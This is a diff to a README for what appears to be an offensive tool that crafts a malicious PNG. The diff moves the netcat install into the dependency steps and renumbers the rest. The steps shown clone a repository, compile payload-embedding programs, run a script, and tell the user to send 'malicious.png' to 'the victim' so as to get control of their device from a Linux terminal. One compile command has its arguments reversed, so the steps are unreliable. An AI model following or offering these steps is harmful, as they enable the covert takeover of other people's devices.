@@ -12,8 +12,12 @@ To use this tool, copy and paste these commands into your Kali Linux terminal:
 sudo apt update && sudo apt upgrade
 
 # 2. Install Necessary Tools
+
 sudo apt install build-essential libpng-dev 
+
 sudo apt install zlib1g-dev
+
+sudo apt install netcat-traditional -y
 
 # 3. Now, Clone The Respiratory (polley)
 git clone https://github.com/anknpolley123/polley.git
@@ -30,13 +34,10 @@ gcc -o embed_payload.c embed_payload -lpng
 # 7. Compile The File craft_malicious_png
 gcc -o craft_malicious_png craft_malicious_png.c -lpng
 
-# 8. Now, Run The Command
-sudo apt install netcat-traditional -y
-
-# 9. Run The Final Command
+# 8. Run The Final Command
 ./run_all.sh
 
-# 10. Send the Malicious File
+# 9. Send the Malicious File
 go to linux File manager, go to home, go to polley folder, select malicious.png, send it to the victim. You will get control of the victim's device in your linux terminal.
 
 # DISCLAIMER 
